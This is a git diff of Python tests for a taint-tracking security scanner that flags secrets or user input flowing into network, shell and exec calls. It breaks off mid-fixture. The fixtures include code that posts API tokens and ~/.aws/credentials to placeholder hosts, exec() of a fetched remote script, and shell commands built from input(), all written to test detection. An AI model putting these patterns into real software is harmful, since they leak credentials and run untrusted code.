@@ -18,6 +18,7 @@
 from __future__ import annotations
 
 import json
+import sys
 import textwrap
 import time
 import tracemalloc
@@ -828,13 +829,13 @@ def _capped_check_runtime(max_calls: int):
 
 
 def _collect(code: str, check_runtime=None) -> dict:
-    """Run `_collect_tainted` directly on *code* and return name -> source calls."""
+    """Run `_collect_tainted` directly on *code* and return name -> source_call."""
     parsed = get_python_ast(None, code, "t.py")
     type_map = build_type_map(parsed.tree, parsed.import_aliases)
     tainted = behavioral_taint_tracking._collect_tainted(
         parsed.tree, type_map, parsed.import_aliases, check_runtime
     )
-    return {name: set(sources) for name, sources in tainted.items()}
+    return {name: tv.source_call for name, tv in tainted.items()}
 
 
 class TestFixpointTermination:
@@ -859,25 +860,7 @@ class TestFixpointTermination:
         sources = _collect(code, _capped_check_runtime(2000))
         assert set(sources) == {"x", "y", "z"}
         # Every name traces back to one of the two credential sources.
-        assert all(source_set <= {"os.getenv", "os.environ"} for source_set in sources.values())
-        assert sources["x"] == {"os.getenv", "os.environ"}
-        assert sources["y"] == {"os.getenv", "os.environ"}
-        assert sources["z"] == {"os.getenv", "os.environ"}
-
-    def test_reassignment_preserves_stronger_source_through_alias(self) -> None:
-        """A later user-input source must not be hidden by an earlier credential source."""
-        for assignments in (
-            'payload = os.getenv("KEY")\npayload = input()\n',
-            'payload = input()\npayload = os.getenv("KEY")\n',
-        ):
-            code = (
-                "import os, subprocess\n"
-                + assignments
-                + "command = payload\n"
-                + "subprocess.run(command, shell=True)\n"
-            )
-            findings = _run(code)
-            assert any(f.rule_id == "TT5" for f in findings)
+        assert set(sources.values()) <= {"os.getenv", "os.environ"}
 
     def test_cyclic_reassignment_flows_to_sink(self) -> None:
         """End to end: the oscillating module plus a sink still reports TT3."""
@@ -914,7 +897,7 @@ class TestFixpointTermination:
         elapsed = time.monotonic() - start
 
         assert len(sources) == depth + 1
-        assert all(srcs == {"os.getenv"} for srcs in sources.values())
+        assert all(src == "os.getenv" for src in sources.values())
         assert elapsed < 1.0
 
     def test_cyclic_reassignment_does_not_hang_without_cap(self) -> None:
@@ -969,7 +952,7 @@ class TestFixpointTermination:
         assert calls["n"] <= n_assignments
         # All read and target names are tainted, all tracing to os.getenv.
         assert len(sources) == 2 * width
-        assert all(srcs == {"os.getenv"} for srcs in sources.values())
+        assert all(src == "os.getenv" for src in sources.values())
         assert elapsed < 1.0
 
 
@@ -991,17 +974,40 @@ def _flows(code: str, rule: str = "TT3") -> list:
     return [f for f in _run(code) if f.rule_id == rule]
 
 
-class TestFunctionScopePrecision:
-    """A tainted name in one function must not taint a same-named name elsewhere.
+def _summary(code: str) -> list[tuple[str, int]]:
+    return sorted((f.rule_id, f.start_line) for f in _run(code))
+
+
+def _messages(code: str) -> list[str]:
+    return [f.message for f in _run(code)]
+
+
+class TestNameClashPrecision:
+    """A tainted name in one scope must not taint a same-named name in another.
 
     Taint used to be keyed by bare variable name across the whole file. Once
     propagation became order-independent (#611), a tainted local such as
     ``headers`` in one function tainted every unrelated variable or parameter
     called ``headers`` in the file, reporting TT3 (CRITICAL) on sinks that never
-    see the credential.
+    see the credential. Each case below is one class of the name clashes found
+    in real skills.
     """
 
-    def test_parameter_named_like_a_tainted_local_is_not_tainted(self) -> None:
+    def test_same_local_name_in_two_functions(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def probe_render():
+                request = {"token": os.environ.get("RENDER_TOKEN")}
+                return len(request)
+            def probe_service(url):
+                request = url + "/health"
+                requests.get(request, timeout=5)
+            """
+        )
+        assert _run(code) == []
+
+    def test_parameter_named_like_a_tainted_local_in_either_order(self) -> None:
         helper = _code(
             """
             def fetch(url, headers):
@@ -1016,25 +1022,70 @@ class TestFunctionScopePrecision:
                 fetch("https://example.invalid/v1", {"Accept": "application/json"})
             """
         )
-        # Definition order must not matter either way.
         for body in (helper + caller, caller + helper):
-            assert _flows("import os, requests\n" + body) == []
+            assert _run("import os, requests\n" + body) == []
 
-    def test_same_local_name_in_two_functions_is_not_shared(self) -> None:
+    def test_caller_local_not_passed_to_a_same_named_parameter(self) -> None:
+        """The callee's ``text`` is a parameter; the caller's ``text`` never reaches it."""
+        code = _code(
+            """
+            import hashlib, os
+            def cache_file(text):
+                key = hashlib.sha256(text.encode()).hexdigest()
+                path = os.path.join("/tmp", key)
+                open(path, "w").write("{}")
+            def main(path):
+                text = open(path).read()
+                print(len(text))
+                cache_file("constant")
+            """
+        )
+        assert _run(code) == []
+
+    def test_nested_function_parameter_named_like_a_tainted_variable(self) -> None:
+        code = _code(
+            """
+            import json, subprocess, sys
+            def make_runner():
+                def runner(stage_path):
+                    payload = json.dumps({"stage_path": stage_path})
+                    subprocess.run(["worker"], input=payload)
+                return runner
+            def worker():
+                job = json.loads(sys.stdin.read())
+                stage_path = job["stage_path"]
+                print(stage_path)
+            """
+        )
+        assert _run(code) == []
+
+    def test_loop_target_named_like_a_tainted_variable(self) -> None:
+        code = _code(
+            """
+            import os, subprocess
+            def configure():
+                host = os.environ.get("REMOTE_HOST")
+                return host
+            def inspect(hosts):
+                for host in hosts:
+                    subprocess.run(["ssh", host, "true"])
+            """
+        )
+        assert _run(code) == []
+
+    def test_local_shadowing_a_tainted_global(self) -> None:
         code = _code(
             """
             import os, requests
-            def read_token():
-                token = os.getenv("API_TOKEN")
-                return len(token)
-            def send_public():
-                token = "public"
-                requests.post("https://example.invalid", data=token)
+            TOKEN = os.getenv("API_TOKEN")
+            def send():
+                TOKEN = "public"
+                requests.post("https://example.invalid", data=TOKEN)
             """
         )
-        assert _flows(code) == []
+        assert _run(code) == []
 
-    def test_method_parameter_named_like_a_tainted_local_is_not_tainted(self) -> None:
+    def test_method_parameter_named_like_a_tainted_local(self) -> None:
         code = _code(
             """
             import os, requests
@@ -1047,35 +1098,48 @@ class TestFunctionScopePrecision:
             Client().send("public")
             """
         )
-        assert _flows(code) == []
+        assert _run(code) == []
 
-    def test_local_shadowing_a_tainted_global_is_not_tainted(self) -> None:
+    def test_comprehension_target_named_like_a_tainted_variable(self) -> None:
         code = _code(
             """
             import os, requests
-            TOKEN = os.getenv("API_TOKEN")
-            def send():
-                TOKEN = "public"
-                requests.post("https://example.invalid", data=TOKEN)
+            url = os.getenv("WEBHOOK_URL")
+            def ping(u):
+                requests.get(u, timeout=5)
+            def check(urls):
+                [requests.get(url, timeout=5) for url in urls]
+                return [ping(url) for url in urls]
             """
         )
-        assert _flows(code) == []
+        assert _run(code) == []
 
-    def test_only_the_parameter_receiving_the_secret_is_tainted(self) -> None:
+    def test_lambda_parameter_named_like_a_tainted_variable(self) -> None:
         code = _code(
             """
             import os, requests
-            def upload(url, payload):
-                requests.get(url)  # CLEAN
-                requests.post(url, data=payload)  # SINK
-            def main():
-                upload("https://example.invalid", os.getenv("API_TOKEN"))
+            payload = os.getenv("API_TOKEN")
+            send = lambda payload: requests.post("https://x.invalid", data=payload)
+            send("public")
             """
         )
-        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]
+        assert _run(code) == []
+
+    def test_class_body_names_are_invisible_to_methods(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            token = "public"
+            class Client:
+                token = os.getenv("API_TOKEN")
+                def send(self):
+                    requests.post("https://x.invalid", data=token)
+            """
+        )
+        assert _run(code) == []
 
     def test_instance_attributes_are_per_class(self) -> None:
-        code = _code(
+        unrelated = _code(
             """
             import os, requests
             class Secret:
@@ -1088,53 +1152,97 @@ class TestFunctionScopePrecision:
                     requests.post("https://example.invalid", data=self.token)
             """
         )
-        assert _flows(code) == []
+        siblings = _code(
+            """
+            import os, requests
+            class ChatProvider:
+                def chat(self, messages):
+                    raise NotImplementedError
+            class NvidiaProvider(ChatProvider):
+                def __init__(self):
+                    self.headers = {"Authorization": os.environ.get("NVIDIA_API_KEY")}
+                def chat(self, messages):
+                    return requests.post("https://nvidia.invalid", headers=self.headers)  # REAL
+            class OllamaProvider(ChatProvider):
+                def __init__(self):
+                    self.headers = {"Content-Type": "application/json"}
+                def chat(self, messages):
+                    return requests.post("http://localhost:11434", headers=self.headers)
+            """
+        )
+        sibling_methods = _code(
+            """
+            import os, requests
+            class Backend:
+                pass
+            class CloudBackend(Backend):
+                def auth_token(self):
+                    return os.environ.get("CLOUD_TOKEN")
+            class LocalBackend(Backend):
+                def auth_token(self):
+                    return "anonymous"
+                def health(self):
+                    return requests.get("http://localhost", params={"u": self.auth_token()})
+            """
+        )
+        assert _run(unrelated) == []
+        assert _summary(siblings) == [("TT3", _line(siblings, "# REAL"))]
+        assert _run(sibling_methods) == []
 
-
-class TestInterproceduralFlows:
-    """Scoping must not lose flows that cross function boundaries."""
-
-    def test_helper_return_assigned_to_the_same_name(self) -> None:
+    def test_only_the_parameter_receiving_the_secret_is_tainted(self) -> None:
         code = _code(
+            """
+            import os, requests
+            def upload(url, payload):
+                requests.get(url)  # CLEAN
+                requests.post(url, data=payload)  # SINK
+            def main():
+                upload("https://example.invalid", os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+
+class TestDirectCalls:
+    """Arguments of direct in-file calls bind to parameters; returns reach callers."""
+
+    def test_helper_returns(self) -> None:
+        same_name = _code(
             """
             import os, requests
             def get_key():
                 key = os.getenv("API_KEY")
                 return key
             def send():
-                key = get_key()
+                key = get_key()  # ASSIGN
                 requests.post("https://example.invalid", data=key)  # SINK
             """
         )
-        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]
-
-    def test_helper_return_assigned_to_another_name(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            def get_key():
-                return os.getenv("API_KEY")
-            def send():
-                value = get_key()
-                requests.post("https://example.invalid", data=value)  # SINK
-            """
+        other_name = same_name.replace("key = get_key()", "value = get_key()").replace(
+            "data=key", "data=value"
         )
-        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]
+        for code, name in ((same_name, "key"), (other_name, "value")):
+            (finding,) = _flows(code)
+            assert finding.start_line == _line(code, "# SINK")
+            assert f"'{name}' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message
 
-    def test_helper_called_inside_the_sink_arguments(self) -> None:
+    def test_helper_called_inside_the_sink(self) -> None:
         code = _code(
             """
             import os, requests
             def get_key():
-                return os.environ["API_KEY"]
+                return os.environ["API_KEY"]  # RETURN
             requests.post("https://example.invalid", data=get_key())
             """
         )
         (finding,) = _flows(code)
-        assert "'get_key()'" in finding.message
+        assert finding.message == (
+            f"Tainted flow: 'get_key()' from os.environ (line {_line(code, '# RETURN')}, "
+            "credential/environment) → requests.post (network output)"
+        )
 
-    def test_chained_helper_returns(self) -> None:
-        code = _code(
+    def test_chained_and_nested_helpers(self) -> None:
+        chained = _code(
             """
             import os, requests
             def raw():
@@ -1144,94 +1252,17 @@ class TestInterproceduralFlows:
             requests.post("https://example.invalid", data=normalized())
             """
         )
-        assert len(_flows(code)) == 1
-
-    def test_secret_bound_to_a_parameter(self) -> None:
-        for call in (
-            "upload(secret)",
-            "upload(payload=secret)",
-            "upload(*[secret])",
-            "upload(**{'payload': secret})",
-            'upload(os.getenv("API_KEY"))',
-        ):
-            code = _code(
-                f"""
-                import os, requests
-                def upload(payload):
-                    requests.post("https://example.invalid", data=payload)
-                def main():
-                    secret = os.getenv("API_KEY")
-                    {call}
-                """
-            )
-            assert len(_flows(code)) == 1, call
-
-    def test_varargs_kwargs_and_defaults_receive_secrets(self) -> None:
-        for definition, call in (
-            ("def send(*value):", 'send("x", os.getenv("API_KEY"))'),
-            ("def send(**value):", 'send(key=os.getenv("API_KEY"))'),
-            ('def send(value=os.getenv("API_KEY")):', "send()"),
-        ):
-            code = _code(
-                f"""
-                import os, requests
-                {definition}
-                    requests.post("https://example.invalid", data=value)
-                {call}
-                """
-            )
-            assert len(_flows(code)) == 1, definition
-
-    def test_function_passed_as_a_callback_receives_following_arguments(self) -> None:
-        for call in (
-            "threading.Thread(target=upload, args=(secret,)).start()",
-            "executor.submit(upload, secret)",
-        ):
-            code = _code(
-                f"""
-                import os, requests, threading
-                def upload(body):
-                    requests.post("https://example.invalid", data=body)
-                def main(executor):
-                    secret = os.getenv("API_KEY")
-                    {call}
-                """
-            )
-            assert len(_flows(code)) == 1, call
-
-    def test_global_assigned_inside_a_function(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            def configure():
-                global TOKEN
-                TOKEN = os.getenv("API_TOKEN")
-            def send():
-                requests.post("https://example.invalid", data=TOKEN)
-            """
-        )
-        assert len(_flows(code)) == 1
-
-    def test_closures_and_nested_functions(self) -> None:
-        """Nested functions see enclosing locals and bind arguments lexically."""
-        free_variable = _code(
-            """
-            import os, requests
-            def outer():
-                token = os.getenv("API_TOKEN")
-                def inner():
-                    requests.post("https://example.invalid", data=token)
-                inner()
-            """
-        )
-        bound_argument = _code(
+        nested = _code(
             """
             import os, requests
             def outer():
                 token = os.getenv("API_TOKEN")
                 def inner(value):
                     requests.post("https://example.invalid", data=value)
+                def free():
+                    requests.post("https://example.invalid", data=token)
                 inner(token)
+                free()
             """
         )
         nonlocal_rebinding = _code(
@@ -1246,110 +1277,65 @@ class TestInterproceduralFlows:
                 requests.post("https://example.invalid", data=token)
             """
         )
-        for code in (free_variable, bound_argument, nonlocal_rebinding):
-            assert len(_flows(code)) == 1, code
+        assert len(_flows(chained)) == 1
+        assert len(_flows(nested)) == 2
+        assert len(_flows(nonlocal_rebinding)) == 1
 
-    def test_instance_attribute_set_in_init(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Client:
-                def __init__(self):
-                    self.token = os.getenv("API_TOKEN")
-                def send(self):
-                    token = self.token
-                    requests.post("https://example.invalid", data=token)
-            """
+    def test_argument_binding(self) -> None:
+        for call in (
+            "upload(secret)",
+            "upload(payload=secret)",
+            "upload(*[secret])",
+            "upload(**{'payload': secret})",
+            'upload(os.getenv("API_KEY"))',
+            "wrapper(secret)",
+            "wrapper(payload=secret)",
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                def upload(payload):
+                    requests.post("https://example.invalid", data=payload)
+                def wrapper(*args, **kwargs):
+                    return upload(*args, **kwargs)
+                def main():
+                    secret = os.getenv("API_KEY")
+                    {call}
+                """
+            )
+            assert len(_flows(code)) == 1, call
+
+    def test_defaults_varargs_and_kwargs(self) -> None:
+        for definition, call in (
+            ("def send(*value):", 'send("x", os.getenv("API_KEY"))'),
+            ("def send(**value):", 'send(key=os.getenv("API_KEY"))'),
+            ('def send(value=os.getenv("API_KEY")):', "send()"),
+            ('def send(*, value=os.getenv("API_KEY")):', "send()"),
+            ("def send(a, b, /, value):", 'send(1, 2, os.getenv("API_KEY"))'),
+        ):
+            code = _code(
+                f"""
+                import os, requests
+                {definition}
+                    requests.post("https://example.invalid", data=value)
+                {call}
+                """
+            )
+            assert len(_flows(code)) == 1, definition
+
+    def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
+        width = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS + 4
+        params = ", ".join(f"p{i}" for i in range(width))
+        args = ", ".join('os.getenv("API_KEY")' if i == width - 1 else str(i) for i in range(width))
+        code = (
+            "import os, requests\n"
+            f"def send({params}):\n"
+            f'    requests.post("https://example.invalid", data=p{width - 1})\n'
+            f"send({args})\n"
         )
         assert len(_flows(code)) == 1
 
-    def test_constructor_argument_stored_on_self(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Client:
-                def __init__(self, token):
-                    self.token = token
-                def send(self):
-                    requests.post("https://example.invalid", headers={"A": self.token})
-            Client(os.getenv("API_TOKEN")).send()
-            """
-        )
-        assert len(_flows(code)) == 1
-
-    def test_class_attribute_read_through_self(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Client:
-                TOKEN = os.getenv("API_TOKEN")
-                def send(self):
-                    requests.post("https://example.invalid", headers={"A": self.TOKEN})
-            """
-        )
-        assert len(_flows(code)) == 1
-
-    def test_attribute_set_in_base_class_read_in_subclass(self) -> None:
-        code = _code(
-            """
-            import os, requests
-            class Base:
-                def __init__(self):
-                    self.token = os.getenv("API_TOKEN")
-            class Child(Base):
-                def send(self):
-                    requests.post("https://example.invalid", data=self.token)
-            """
-        )
-        assert len(_flows(code)) == 1
-
-    def test_method_calls_bind_arguments(self) -> None:
-        on_instance = _code(
-            """
-            import os, requests
-            class Api:
-                def upload(self, body):
-                    requests.post("https://example.invalid", data=body)
-            def main():
-                api = Api()
-                api.upload(os.getenv("API_TOKEN"))
-            """
-        )
-        on_self = _code(
-            """
-            import os, requests
-            class Api:
-                def _send(self, body):
-                    requests.post("https://example.invalid", data=body)
-                def run(self):
-                    self._send(os.getenv("API_TOKEN"))
-            """
-        )
-        static = _code(
-            """
-            import os, requests
-            class Api:
-                @staticmethod
-                def send(body):
-                    requests.post("https://example.invalid", data=body)
-            Api.send(os.getenv("API_TOKEN"))
-            """
-        )
-        for code in (on_instance, on_self, static):
-            assert len(_flows(code)) == 1, code
-
-    def test_user_input_reaching_exec_through_a_helper(self) -> None:
-        code = _code(
-            """
-            import subprocess
-            def run(command):
-                subprocess.run(command, shell=True)
-            run(input())
-            """
-        )
-        assert len(_flows(code, "TT5")) == 1
-
-    def test_recursive_helpers_terminate(self) -> None:
+    def test_recursion_terminates(self) -> None:
         code = _code(
             """
             import os, requests
@@ -1363,13 +1349,84 @@ class TestInterproceduralFlows:
         )
         assert len(_flows(code)) == 1
 
+    def test_redefinitions_merge_into_one_callee(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def send(body):
+                print(body)
+            def send(body):
+                requests.post("https://example.invalid", data=body)  # SINK
+            send(os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_global_assigned_inside_a_function(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def configure(value):
+                global TOKEN
+                TOKEN = value
+            def send():
+                requests.post("https://example.invalid", data=TOKEN)
+            configure(os.getenv("API_TOKEN"))
+            """
+        )
+        assert len(_flows(code)) == 1
+
+    def test_lambdas_bound_to_names_and_called_inline(self) -> None:
+        named = _code(
+            """
+            import os, requests
+            post_secret = lambda payload: requests.post("https://x.invalid", data=payload)  # SINK
+            def main():
+                value = os.getenv("API_TOKEN")
+                post_secret(value)
+            """
+        )
+        returned = _code(
+            """
+            import os, requests
+            token = lambda: os.getenv("API_TOKEN")  # RETURN
+            requests.post("https://x.invalid", data=token())  # SINK
+            """
+        )
+        assert _summary(named) == [("TT3", _line(named, "# SINK"))]
+        assert _summary(returned) == [("TT3", _line(returned, "# SINK"))]
+
+    def test_exec_and_file_flows_through_helpers(self) -> None:
+        exec_flow = _code(
+            """
+            import requests, subprocess
+            def fetch():
+                return requests.get("https://x.invalid/script").text
+            def run(command):
+                subprocess.run(command, shell=True)
+            run(input())
+            exec(fetch())
+            """
+        )
+        file_flow = _code(
+            """
+            import os, requests
+            def read():
+                return open(os.path.expanduser("~/.aws/credentials")).read()
+            creds = read()
+            requests.post("https://x.invalid", data=creds)
+            """
+        )
+        assert [f.rule_id for f in _run(exec_flow)] == ["TT5", "TT5"]
+        assert [f.rule_id for f in _run(file_flow)] == ["TT4"]
+
     def test_token_from_helper_header_builder_reaches_request(self) -> None:
         """A token loaded by a helper, put in an auth header and sent, is TT3."""
         code = _code(
             """
             import os, requests
             def load_token():
-                token = os.getenv("SERVICE_TOKEN")  # SOURCE
+                token = os.getenv("SERVICE_TOKEN")
                 return token.strip() if token else None
             def auth_headers(token=None):
                 if token is None:
@@ -1389,13 +1446,811 @@ class TestInterproceduralFlows:
         )
 
 
+class TestContextSensitivity:
+    """One caller's secret must not taint other calls of the same helper."""
+
+    def test_helper_result_is_tainted_only_where_the_secret_is_passed(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def _headers(token=None):
+                h = {"Accept": "application/json"}
+                if token:
+                    h = {"Accept": "application/json", "Authorization": f"Bearer {token}"}
+                return h
+            def private_api():
+                return requests.get("https://api.invalid/me", headers=_headers(os.getenv("T")))  # SINK
+            def public_status():
+                return requests.post("https://status.invalid/ping", headers=_headers())
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_pure_transform_helper_does_not_leak_between_callers(self) -> None:
+        code = _code(
+            """
+            import os, json, requests
+            def to_json(obj):
+                return json.dumps(obj, indent=2)
+            def save_config():
+                cfg = {"api_key": os.getenv("API_KEY")}
+                print(to_json(cfg))
+            def report(results):
+                requests.post("https://telemetry.invalid", data=to_json(results))
+            """
+        )
+        assert _run(code) == []
+
+    def test_closures_and_lambdas_do_not_leak_between_callers(self) -> None:
+        closure = _code(
+            """
+            import os, requests
+            def wrap(value):
+                def inner():
+                    return value
+                return inner()
+            def log_key():
+                print(wrap(os.getenv("API_KEY")))
+            def upload():
+                body = wrap("public text")
+                requests.post("https://example.invalid", data=body)
+            """
+        )
+        lambda_closure = closure.replace(
+            "def inner():\n        return value\n    return inner()",
+            "get = lambda: value\n    return get()",
+        )
+        named_lambda = _code(
+            """
+            import base64, os, requests
+            b64 = lambda text: base64.b64encode(text.encode()).decode()
+            def auth_header():
+                return "Basic " + b64("user:" + os.getenv("PASSWORD", ""))
+            def upload(report):
+                requests.post("https://example.invalid/upload", data=b64(report))
+            """
+        )
+        assert "get = lambda: value" in lambda_closure
+        for code in (closure, lambda_closure, named_lambda):
+            assert _run(code) == [], code
+
+    def test_secrets_still_flow_through_arguments_globals_and_attributes(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def remember(value):
+                global TOKEN
+                TOKEN = value
+            class Holder:
+                def __init__(self, secret):
+                    self.keep(secret)
+                def keep(self, value):
+                    self.value = value
+                def send(self):
+                    requests.post("https://x.invalid", data=self.value)  # ATTR
+            def wrap(value):
+                return {"v": value}
+            def main():
+                secret = os.getenv("API_KEY")
+                remember(secret)
+                Holder(secret)
+                requests.post("https://x.invalid", json=wrap(secret))  # ARG
+            def later():
+                requests.post("https://x.invalid", data=TOKEN)  # GLOBAL
+            """
+        )
+        assert _summary(code) == sorted(
+            ("TT3", _line(code, marker)) for marker in ("# ATTR", "# ARG", "# GLOBAL")
+        )
+
+    def test_inline_source_through_a_helper_is_reported_once(self) -> None:
+        network = _code(
+            """
+            import requests
+            def wrap(text):
+                return {"q": text}
+            requests.post("https://api.invalid/search", json=wrap(input("query: ")))
+            """
+        )
+        command = _code(
+            """
+            import os, subprocess
+            def make_cmd(binary):
+                return [binary, "--version"]
+            subprocess.run(make_cmd(os.environ.get("TOOL_BIN")))
+            """
+        )
+        assert [f.rule_id for f in _run(network)] == ["TT1"]
+        assert [f.rule_id for f in _run(command)] == ["TT1"]
+
+    def test_nested_in_file_calls_bind_through_their_values(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            def ident(value):
+                return value
+            def send(body):
+                requests.post("https://x.invalid", data=body)  # SINK
+            def main():
+                send(ident(ident(os.getenv("API_KEY"))))
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+
+class TestMethods:
+    """``self.m``/``cls.m``/``Class.m``/``super().m`` and ``Class(...)`` bind syntactically."""
+
+    def test_self_and_cls_methods(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Client:
+                def _token(self):
+                    return os.getenv("API_TOKEN")  # SOURCE
+                def send(self):
+                    requests.post("https://x.invalid", data=self._token())  # RETURNED
+                def _post(self, body):
+                    requests.post("https://x.invalid", data=body)  # BOUND
+                def run(self):
+                    self._post(os.getenv("OTHER"))
+                @classmethod
+                def _class_post(cls, body):
+                    requests.post("https://x.invalid", data=body)  # CLASSMETHOD
+                @classmethod
+                def run_class(cls):
+                    cls._class_post(os.getenv("OTHER"))
+            """
+        )
+        assert _summary(code) == sorted(
+            ("TT3", _line(code, marker)) for marker in ("# RETURNED", "# BOUND", "# CLASSMETHOD")
+        )
+        (returned,) = [f for f in _run(code) if f.start_line == _line(code, "# RETURNED")]
+        assert returned.message.startswith(
+            f"Tainted flow: 'self._token()' from os.getenv (line {_line(code, '# SOURCE')},"
+        )
+
+    def test_methods_bind_only_into_their_own_class_or_bases(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Api:
+                def upload(self, body):
+                    print(body)
+                def run(self):
+                    self.upload(os.getenv("API_TOKEN"))
+            class Mirror:
+                def upload(self, body):
+                    requests.post("https://example.invalid", data=body)
+            class Sub(Api):
+                def go(self):
+                    self.upload(os.getenv("API_TOKEN"))
+            """
+        )
+        assert _run(code) == []
+
+    def test_bases_are_searched_left_to_right(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            class Local:
+                def send(self, body):
+                    print(body)
+            class Remote:
+                def send(self, body):
+                    requests.post("https://x.invalid", data=body)
+            class Client(Local, Remote):
+                def run(self):
+                    self.send(os.getenv("API_KEY"))
+            """
+        )
+        assert _run(code) == []
+        flipped = code.replace("class Client(Local, Remote):", "class Client(Remote, Local):")
+        assert [f.rule_id for f in _run(flipped)] == ["TT3"]
+
+    def test_attribute_getters_return_what_a_call_stored(self) -> None:
+        """Attributes are class state: a parameter stored on ``self`` is read back
+        by getters, not only by direct ``self.x`` reads."""
+        code = _code(
+            """
+            import os, requests
+            class Holder:
+                def keep(self, value):
+                    self.value = value
+                def get(self):
+                    return self.value
+                def run(self):
+                    self.keep(os.getenv("API_KEY"))
+                def send(self):
+                    requests.post("https://x.invalid", data=self.get())  # SINK
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_nearest_in_file_base_defines_the_method(self) -> None:
+        code = _code(
+            """
+            import os, requests
+            from typing import Generic, TypeVar
+            T = TypeVar("T")
+            class Transport:
+                def _post(self, body):
+                    requests.post("https://x.invalid", data=body)  # SINK
+            class Mixin:
+                pass
+            class Base(Generic[T], Transport):
+                pass
+            class Client(Mixin, Base[dict]):
+                def report(self):
+                    self._post(os.getenv("API_KEY"))
+            """
+        )
+        assert _summary(code) == [("TT3", _line(code, "# SINK"))]
+
+    def test_class_object_calls_pass_the_receiver_explicitly(self) -> None:
+        true_flow = _code(
+            """
+            import os, requests
+            class Base:
+                def __init__(self, token):
+                    requests.post("https://x.invalid", data=token)  # SINK
+            class Child(Base):
+                def __init__(self):
+                    token = os.getenv("TOKEN")
+                    Base.__init__(self, token)
+            """
+        )
+        shifted = _code(
+            """
+            import os, requests
+            class Base:
+                def __init__(self, user, body):
+                    print(user)
+                    requests.post("https://x.invalid", data=body)
+            class Child(Base):
+                def __init__(self):
+                    Base.__init__(self, os.getenv("USER_NAME"), "public")
+            """
+        )
+        static_and_class = _code(
+            """
+            import os, requests
+            class Api:
+                @staticmethod
+                def send(body):
+                    requests.post("https://x.invalid", data=body)  # STATIC
+                @classmethod
+                def post(cls, body):
+                    requests.post("https://x.invalid", data=body)  # CLASS
+            Api.send(os.getenv("API_TOKEN"))
+            Api.post(os.getenv("API_TOKEN"))
+            """
+        )
+        assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]
+        assert _run(shifted) == []
+        assert _summary(static_and_class) == sorted(
+            ("TT3", _line(static_and_class, marker)) for marker in ("# STATIC", "# CLASS")
+        )
+
+    def test_constructors_bind_to_init(self) -> None:
+        by_name = _code(
+            """
+            import os, requests
+            class Client:
+                def __init__(self, token):
+                    self.token = token
+                def send(self):
+                    requests.post("https://x.invalid", headers={"A": self.token})  # SINK
+            Client(os.getenv("API_TOKEN")).send()
+            """
+        )
+        by_cls = _code(
+            """
+            import os, requests
+            class Client:
+                def __init__(self, token):
+                    requests.post("https://auth.invalid", data={"token": token})  # SINK
+                @classmethod
+                def from_env(cls):
+                    token = os.environ.get("API_TOKEN")
+                    return cls(token)
+            """
+        )
+        for code in (by_name, by_cls):
+            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code
+
+    def test_super_calls_use_the_base_lookup(self) -> None:
+        returned = _code(
+            """
+            import os, requests
+            class Base:
+                def auth(self):
+                    token = os.environ["TOKEN"]
+                    return token
+            class Child(Base):
+                def send(self):
+                    token = super().auth()
+                    requests.post("https://x.invalid", data=token)  # ZERO_ARG
+                def send2(self):
+                    requests.post("https://x.invalid", data=super(Child, self).auth())  # TWO_ARG
+            """
+        )
+        unrelated_init = _code(
+            """
+            import os, requests
+            class Credentials:
+                def __init__(self, token):
+                    self.token = token
+            class EnvCredentials(Credentials):
+                def __init__(self):
+                    super().__init__(os.environ.get("API_TOKEN"))
+            class Downloader:
+                def __init__(self, url):
+                    self.url = url
+                def fetch(self):
+                    return requests.get(self.url, timeout=10)
+            class ApiError(Exception):
+                def __init__(self, message):
+                    super().__init__(message)
+            def run(cmd):
+                raise ApiError(requests.get(cmd).text)
+            """
+        )
+        overridden = _code(
+            """
+            import os, requests
+            class Base:
+                def send(self, payload):
+                    print(payload)
+                def auth(self):
+                    return "public"
+            class Child(Base):
+                def send(self, payload):
+                    requests.post("https://x.invalid", data=payload)
+                def auth(self):
+                    return os.getenv("TOKEN")
+                def run(self):
+                    super().send(os.getenv("TOKEN"))
+                    requests.post("https://x.invalid", data=super().auth())
+            """
+        )
+        assert _summary(returned) == [
+            ("TT3", _line(returned, "# ZERO_ARG")),
+            ("TT3", _line(returned, "# TWO_ARG")),
+        ]
+        assert _run(unrelated_init) == []
+        assert _run(overridden) == []
+
+    def test_attributes_are_seen_by_the_class_and_its_subclasses(self) -> None:
+        set_in_init = _code(
+            """
+            import os, requests
+            class Client:
+                TOKEN = os.getenv("CLASS_TOKEN")
+                def __init__(self):
+                    self.token = os.getenv("API_TOKEN")
+                def send(self):
+                    token = self.token
+                    requests.post("https://x.invalid", data=token)  # LOCAL
+                def send_class(self):
+                    requests.post("https://x.invalid", headers={"A": self.TOKEN})  # CLASS
+            class Child(Client):
+                def send_child(self):
+                    requests.post("https://x.invalid", data=self.token)  # CHILD
+            """
+        )
+        parent_reads = _code(
+            """
+            import os, requests
